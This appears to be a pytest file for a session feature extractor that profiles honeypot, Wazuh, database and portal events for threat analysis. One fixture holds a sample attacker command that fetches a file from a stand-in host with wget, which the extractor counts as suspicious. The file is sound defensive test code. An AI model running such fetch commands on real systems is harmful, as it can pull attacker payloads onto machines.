import json
import pytest
from profiler_xai.feature_extractor import FeatureExtractor, FEATURE_NAMES
from profiler_xai.schemas import NormalizedEvent

def ev(**kw):
    d={"event_id":"e1","session_id":"s1","timestamp":"2026-01-01T00:00:00Z","source":"cowrie",
       "event_type":"login_attempt","command":"","bytes_in":0,"bytes_out":0,"status":"","severity":"","resource":""}
    d.update(kw); return d

def test_30_features_and_stable_schema():
    x=FeatureExtractor(); x.add_event(ev()); row=x.features_for("s1")
    assert len(FEATURE_NAMES)==30
    assert all(k in row for k in FEATURE_NAMES)

def test_counts_and_aggregates():
    x=FeatureExtractor()
    x.add_events([
      ev(event_id="1",event_type="login_attempt"),
      ev(event_id="2",timestamp="2026-01-01T00:00:05Z",event_type="login_failure",status="failed"),
      ev(event_id="3",timestamp="2026-01-01T00:00:10Z",event_type="command",command="wget http://example.invalid/x",bytes_out=12),
      ev(event_id="4",timestamp="2026-01-01T00:00:15Z",source="wazuh",event_type="alert",severity="critical"),
      ev(event_id="5",timestamp="2026-01-01T00:00:20Z",source="database",event_type="db_write",bytes_in=3),
      ev(event_id="6",timestamp="2026-01-01T00:00:25Z",source="portal",event_type="portal_admin_update")])
    r=x.features_for("s1")
    assert r["event_count"]==6 and r["suspicious_command_count"]==1
    assert r["wazuh_critical_severity_count"]==1 and r["database_write_count"]==1
    assert r["portal_admin_action_count"]==1 and r["bytes_total"]==15

def test_duplicate_id_ignored():
    x=FeatureExtractor(); x.add_events([ev(event_id="same"),ev(event_id="same",event_type="command")])
    assert x.features_for("s1")["event_count"]==1

def test_snapshot_restore_and_dedup():
    x=FeatureExtractor(); x.add_event(ev(event_id="e1"))
    y=FeatureExtractor.from_snapshot(json.loads(json.dumps(x.snapshot())))
    y.add_event(ev(event_id="e1",event_type="command"))
    y.add_event(ev(event_id="e2",timestamp="2026-01-01T00:00:10Z",event_type="command",command="whoami"))
    assert y.features_for("s1")["event_count"]==2
    assert y.features_for("s1")["command_event_count"]==1

def test_schema_validation():
    with pytest.raises(ValueError):
        NormalizedEvent.from_mapping({"session_id":"s","timestamp":"t","source":"unknown","event_type":"x"})
    with pytest.raises(ValueError):
        NormalizedEvent.from_mapping({"session_id":"s","source":"cowrie","event_type":"x"})

def test_negative_bytes_rejected():
    with pytest.raises(ValueError): NormalizedEvent.from_mapping(ev(bytes_in=-1))
